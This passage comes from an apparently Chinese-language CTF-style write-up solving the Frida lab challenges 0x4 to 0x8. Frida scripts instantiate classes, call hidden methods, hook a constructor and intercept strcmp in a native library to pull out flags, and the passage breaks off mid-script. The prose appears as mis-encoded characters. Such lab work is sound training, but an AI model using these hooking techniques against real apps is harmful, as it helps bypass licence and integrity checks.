src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x4/04-1.png" alt="image-20250228103930255"></p><p>ä½†æ˜¯ MainActivity å¹¶æ²¡æœ‰è°ƒç”¨è¿‡ Checkï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬è¦å…ˆåˆ›å»ºå®ä¾‹ï¼Œç„¶åå†è¿›è¡Œè°ƒç”¨ hook</p><h3 id="expï¼š-2"><a href="#expï¼š-2" class="headerlink" title="expï¼š"></a>expï¼š</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> check = a.$new(); <span class="comment">//æ‰‹åŠ¨åˆ›å»ºå®ä¾‹</span></span><br><span class="line">    <span class="keyword">var</span> flag = check.<span class="title function_">get_flag</span>(<span class="number">1337</span>); <span class="comment">//è°ƒç”¨è·å¾—è¿”å›å€¼flag</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flag: &quot;</span> + flag);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">hookTest1</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><hr><h2 id="frida-0x5"><a href="#frida-0x5" class="headerlink" title="frida_0x5"></a>frida_0x5</h2><p>è¿™ä¸ªé¢˜æ˜¯è¦ hook åœ¨ MainActivity ä¸­çš„æ™®é€šæ–¹æ³•</p><p>å› ä¸ºæ˜¯åœ¨ MainActivity ä¹‹ä¸­æ‰€ä»¥å°±æ²¡æœ‰å¿…è¦æ‰‹åŠ¨è¿›è¡Œå®ä¾‹åŒ–</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x5/05.png" alt="image-20250228112841728"></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è·å¾—è¿™ä¸ªå®ä¾‹å°±å¯ä»¥äº†</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hookéé™æ€æ–¹æ³•</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>,&#123;    <span class="comment">//è¦hookçš„ç±»</span></span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                ret=instance.<span class="title function_">flag</span>(<span class="number">1337</span>); <span class="comment">//è¦hookçš„æ–¹æ³•</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="comment">// console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">hookTest2</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br><span class="line"></span><br><span class="line">frida -U -F -l .\hook.<span class="property">js</span></span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x5/05-1.png" alt="image-20250228113019144"></p><hr><h2 id="frida-0x6"><a href="#frida-0x6" class="headerlink" title="frida_0x6"></a>frida_0x6</h2><p>è¿™é“æ˜¯ hook ä¸€ä¸ªåœ¨ MainActivity ä¸­çš„æ™®é€šæ–¹æ³•</p><p>ä½†æ˜¯è¿™ä¸ªæ™®é€šæ–¹æ³•ä¸­çš„å‚æ•°æ˜¯ä¸€ä¸ªæœªè¢«å®ä¾‹åŒ–çš„ç±»ä¸­çš„ä¸¤ä¸ªå‚æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x6/06.png" alt="image-20250228150218173"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x6/06-1.png" alt="image-20250228150233351"></p><p>è¦ hook è¿™ä¸ªæ–¹æ³•çš„è¯åªéœ€è¦è°ƒç”¨æ–¹æ³•ä¹‹å‰å°† Check ç±»è¿›è¡Œå®ä¾‹åŒ–ä»¥åŠå¯¹é‡Œé¢çš„å˜é‡è¿›è¡Œèµ‹å€¼å°±å¯ä»¥äº†</p><h3 id="expï¼š-3"><a href="#expï¼š-3" class="headerlink" title="expï¼š"></a>expï¼š</h3><p>è¿™é‡Œæœ‰ä¸ªæ³¨æ„ç‚¹ï¼Œå› ä¸º check.num1 å®ƒåªæ˜¯ä¸€ä¸ª frida ä»£ç†çš„ä¸€ä¸ªå­—æ®µå¯¹è±¡ï¼Œç›´æ¥è¿›è¡Œèµ‹å€¼æ˜¯èµ‹ä¸äº†çš„ï¼Œ</p><p>è¦ç»™å…¶æ‰€ä»£ç†çš„è¿›è¡Œèµ‹å€¼æ˜¯è¦ç”¨ check.num1.value</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> ret = <span class="literal">null</span>;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x6.MainActivity&quot;</span>, &#123;</span><br><span class="line">      <span class="comment">//è¦hookçš„ç±»</span></span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> check = checker.$new();</span><br><span class="line">        check.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">1234</span>;</span><br><span class="line">        check.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">4321</span>;</span><br><span class="line">        instance.<span class="title function_">get_flag</span>(check); <span class="comment">//è¦hookçš„æ–¹æ³•</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x6/06-2.png" alt="image-20250228152204483"></p><hr><h2 id="frida-0x7"><a href="#frida-0x7" class="headerlink" title="frida_0x7"></a>frida_0x7</h2><p>è¿™é¢˜å’Œä¸Šé¢ 0x6 å·®ä¸å¤šï¼Œ</p><p>å…ˆæ˜¯æŸ¥çœ‹ MainActivityï¼Œï¼Œå‘ç° Check å·²ç»è¢«å®ä¾‹åŒ–äº†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x7/07.png" alt="image-20250228154942647"></p><p>ä½†æ˜¯è¿™é‡Œå¯ä»¥æœ‰ä¸¤ç§è§£æ³•</p><h3 id="è§£ä¸€ï¼š"><a href="#è§£ä¸€ï¼š" class="headerlink" title="è§£ä¸€ï¼š"></a>è§£ä¸€ï¼š</h3><p>å’Œä¸Šä½“ä¸€æ ·ç›´æ¥å½“ä½œæ™®é€šç±»è¿›è¡Œ hookï¼Œä½†æ˜¯è¿™é‡Œæœ‰æ„é€ æ–¹æ³•</p><p>éœ€è¦æŒ‰ç…§æ„é€ æ–¹æ³•çš„ä¼ å‚è¿›è¡Œ hook</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x7/07-1.png" alt="image-20250228154723182"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>,&#123;    <span class="comment">//è¦hookçš„ç±»</span></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> a = <span class="number">513</span>;</span><br><span class="line">                <span class="keyword">var</span> b = <span class="number">513</span>;</span><br><span class="line">                <span class="keyword">var</span> check = checker.$new(a,b);</span><br><span class="line"><span class="comment">//var check = checker.$new(513,513);ç›´æ¥è¿›è¡Œèµ‹å€¼ä¹Ÿè¡Œ</span></span><br><span class="line">                instance.<span class="title function_">flag</span>(check); <span class="comment">//è¦hookçš„æ–¹æ³•</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="comment">// console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">frida -U -F -l .\hook.<span class="property">js</span></span><br></pre></td></tr></table></figure><h3 id="è§£äºŒï¼šhook-æ„é€ æ–¹æ³•"><a href="#è§£äºŒï¼šhook-æ„é€ æ–¹æ³•" class="headerlink" title="è§£äºŒï¼šhook æ„é€ æ–¹æ³•"></a>è§£äºŒï¼šhook æ„é€ æ–¹æ³•</h3><hr><p>å› ä¸º Check ç±»ä¸­å£°æ˜äº†æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥ hook æ„é€ æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">    utils.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.$init(<span class="number">513</span>,<span class="number">513</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">frida -U -f com.<span class="property">ad2001</span>.<span class="property">frida0x7</span> -l .\frida0x7.<span class="property">js</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ overload(â€˜intâ€™,â€™intâ€™)å¯ä»¥çœç•¥ï¼Œä½†æ˜¯ä¸ºäº†é‡æ„çš„å‡†ç¡®æ€§è¿˜æ˜¯åŠ ä¸Šä¸ºå¥½</p><p>function(a,b)ï¼Œè¿™é‡Œå¯¹åº”ç€åŸæ¥çš„å‚æ•°ä¸ªæ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x7/07-2.png" alt="image-20250228161832614"></p><hr><h2 id="frida-0x8"><a href="#frida-0x8" class="headerlink" title="frida_0x8"></a>frida_0x8</h2><p>è¿™é“é¢˜æ˜¯è¦ hook *<u><strong>é™æ€æ³¨å†Œ</strong></u>*çš„ JNI native å±‚çš„å‡½æ•°</p><h3 id="å‰ç½®äº†è§£ï¼š"><a href="#å‰ç½®äº†è§£ï¼š" class="headerlink" title="å‰ç½®äº†è§£ï¼š"></a>å‰ç½®äº†è§£ï¼š</h3><p><a href="https://www.52pojie.cn/thread-1840174-1-1.html">https://www.52pojie.cn/thread-1840174-1-1.html</a></p><p>è¦å…ˆäº†è§£ä¸€ä¸‹å¯¼å…¥è¡¨ï¼Œå¯¼å‡ºè¡¨ï¼Œä»¥åŠ so çš„åŸºå€çš„è·å–æ–¹æ³•</p><h4 id="æ‰“å°å¯¼å…¥è¡¨"><a href="#æ‰“å°å¯¼å…¥è¡¨" class="headerlink" title="æ‰“å°å¯¼å…¥è¡¨"></a>æ‰“å°å¯¼å…¥è¡¨</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> imports = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¯¼å…¥è¡¨ï¼š\n&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(imports, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"><span class="comment">//è¿™ä¸¤ç§æ•ˆæœç›¸åŒ</span></span><br><span class="line"><span class="comment">// console.log(&quot;å¯¼å…¥è¡¨&quot;);</span></span><br><span class="line"><span class="comment">// for (var i = 0; i &lt; imports.length; i++)&#123;</span></span><br><span class="line"><span class="comment">//     // if(imports[i].name == &quot;vip&quot;)&#123;</span></span><br><span class="line"><span class="comment">//     console.log(JSON.stringify(imports[i], null, 2)); //é€šè¿‡JSON.stringifyæ‰“å°objectæ•°æ®</span></span><br><span class="line"><span class="comment">//     // console.log(imports[i].address);</span></span><br><span class="line"><span class="comment">//     //&#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><h4 id="æ‰“å°å¯¼å‡ºè¡¨"><a href="#æ‰“å°å¯¼å‡ºè¡¨" class="headerlink" title="æ‰“å°å¯¼å‡ºè¡¨"></a>æ‰“å°å¯¼å‡ºè¡¨</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¯¼å‡ºè¡¨ï¼š\n&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"><span class="comment">//è¿™ä¸¤ç§æ•ˆæœç›¸åŒ</span></span><br><span class="line"><span class="comment">// console.log(&quot;å¯¼å‡ºè¡¨&quot;);</span></span><br><span class="line"><span class="comment">// for (var i = 0; i &lt; exports.length; i++)&#123;</span></span><br><span class="line"><span class="comment">//     console.log(JSON.stringify(exports[i], null, 2));</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><h4 id="æ‰“å°-so-åŸºå€"><a href="#æ‰“å°-so-åŸºå€" class="headerlink" title="æ‰“å°.so åŸºå€"></a>æ‰“å°.so åŸºå€</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> baseAddr = <span class="title class_">Module</span>.<span class="title function_">getBaseAddress</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Base Address of libfrida0x8.so:&quot;</span>, baseAddr);</span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾æ‰“å°æŒ‡å®š-so-ä¸­-export-åº“ä¸­çš„å‡½æ•°åœ°å€"><a href="#å¯»æ‰¾æ‰“å°æŒ‡å®š-so-ä¸­-export-åº“ä¸­çš„å‡½æ•°åœ°å€" class="headerlink" title="å¯»æ‰¾æ‰“å°æŒ‡å®š so ä¸­ export åº“ä¸­çš„å‡½æ•°åœ°å€"></a>å¯»æ‰¾æ‰“å°æŒ‡å®š so ä¸­ export åº“ä¸­çš„å‡½æ•°åœ°å€</h4><p>è¿™é‡Œæœ‰ä¸¤ä¸ª api æ–¹æ³•</p><p>Module.findExportByName(libï¼ŒexportName)</p><p>ä» lib ä¸­å¯»æ‰¾æŒ‡å®šå‡½æ•°çš„åœ°å€ï¼Œè‹¥ä¸çŸ¥é“ lib åç§°å¯ä»¥ä¼  NULLï¼Œæ‰¾ä¸åˆ°å‡½æ•°ä¼šæŠ›å‡ºå¼‚å¸¸</p><p>Module.getExportByName(libï¼ŒexportName)</p><p>åŠŸèƒ½ä¸ getExportByName ç›¸åŒï¼Œæ‰¾ä¸åˆ°è¿”å› null</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//getExportByName</span></span><br><span class="line"><span class="comment">//ä»libä¸­å¯»æ‰¾æŒ‡å®šå‡½æ•°çš„åœ°å€ï¼Œè‹¥ä¸çŸ¥é“libåç§°å¯ä»¥ä¼ NULLï¼Œæ‰¾ä¸åˆ°ä¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line"><span class="keyword">var</span> cmpstr_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(</span><br><span class="line">  <span class="string">&quot;libfrida0x8.so&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">var</span> strcmp_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> strcmp_null_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\ncmpstr_addr:&quot;</span>, cmpstr_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;strcmp_addr:&quot;</span>, strcmp_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;strcmp_null_addr:&quot;</span>, strcmp_null_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¨‹åºä¸­æ²¡æœ‰è¿™ä¸ªå‡½æ•°ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ˜¾ç¤ºæŠ¥é”™</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Closure</span>_addr = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;Closure&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Closure_addr:&quot;</span>, <span class="title class_">Closure</span>_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//findExportByName</span></span><br><span class="line"><span class="comment">//åŠŸèƒ½ä¸getExportByNameç›¸åŒï¼Œæ‰¾ä¸åˆ°è¿”å›null</span></span><br><span class="line"><span class="keyword">var</span> strcmp_ad = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> strcmp_null_ad = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\ncmpstr_ad:&quot;</span>, strcmp_ad);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;strcmp_null_ad:&quot;</span>, strcmp_null_ad);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¨‹åºä¸­æ²¡æœ‰è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¿”å›çš„æ˜¯null,æ‰€ä»¥ä¼šæ‰“å°nullç„¶åç»§ç»­å‘ä¸‹æ­£å¸¸è¿è¡Œ</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Closure</span>_ad = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>, <span class="string">&quot;Closure&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Closure_addr:&quot;</span>, <span class="title class_">Closure</span>_ad);</span><br></pre></td></tr></table></figure><h3 id="è§£é¢˜è¿‡ç¨‹ï¼š"><a href="#è§£é¢˜è¿‡ç¨‹ï¼š" class="headerlink" title="è§£é¢˜è¿‡ç¨‹ï¼š"></a>è§£é¢˜è¿‡ç¨‹ï¼š</h3><p>çœ‹ MainActivity å‘ç°æœ‰ä¸€ä¸ª native å±‚çš„å‡½æ•° cmpstr</p><p>å¹¶ä¸” flag çš„åˆ¤æ–­æ¡ä»¶ä¹Ÿæ˜¯è¿™ä¸ªå‡½æ•°</p><p>æ‰€ä»¥æˆ‘ä»¬è¦åœ¨å‡½æ•°è¢«è°ƒç”¨å‰è¿›è¡Œ hook</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x8/08.png" alt="image-20250302142540583"></p><p>ç”¨ ida æŸ¥çœ‹ frida0x8.so</p><p>æ‰¾åˆ° Java_com_ad2001_frida0x8_MainActivity_cmpstr</p><p>è¿™ä¸ªå‘½åè§„åˆ™å’Œ java å±‚çš„åŒ…åæ˜¯ä¸€æ ·çš„ï¼Œåªè¦æŠŠåŒ…åçš„.æ¢æˆ_å°±å¯ä»¥äº†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/frida_lab/frida0x8/08-1.png" alt="image-20250302142811969"></p><p>æ ¹æ®ä¼ªä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°æˆ‘ä»¬å®é™…ä¸Šè¦ hook çš„æ˜¯ cmpstr ä¸­çš„ strcmp å‡½æ•°ï¼Œ</p><p>å› æ­¤è¿™é“é¢˜çš„ hook ç›®æ ‡å°±æ˜¯ strcmp</p><p>å…¶ä¸­å‚æ•° s1 æ˜¯æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œs2 æ˜¯ flag</p><p>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹å…ˆçœ‹.so çš„å¯¼å…¥è¡¨ç„¶åå†è·å– strcmp çš„åœ°å€è¿›è¡Œ hook</p><h3 id="expï¼š-4"><a href="#expï¼š-4" class="headerlink" title="expï¼š"></a>expï¼š</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> imp = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;å¯¼å…¥è¡¨ï¼š\n&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(imp, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> strcmp_add = <span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;strcmp_addr:&quot;</span>, strcmp_add);</span><br><span class="line">    <span class="keyword">var</span> out_put;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_add, &#123;</span><br><span class="line">      <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="comment">//ä½œç”¨äºç›®æ ‡å‡½æ•°è¢«è°ƒç”¨å‰ï¼Œé€šå¸¸ç”¨äºè·å–/ä¿®æ”¹å‡½æ•°å‚æ•°</span></span><br><span class="line">        <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">var</span> arg1 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">1</span>]);</span><br><span class="line">        out_put = arg1;</span><br><span class="line">        <span class="keyword">if</span> (arg0.<span class="title function_">includes</span>(<span class="string">&quot;tttt&quot;</span>)) &#123;</span><br><span class="line">          <span 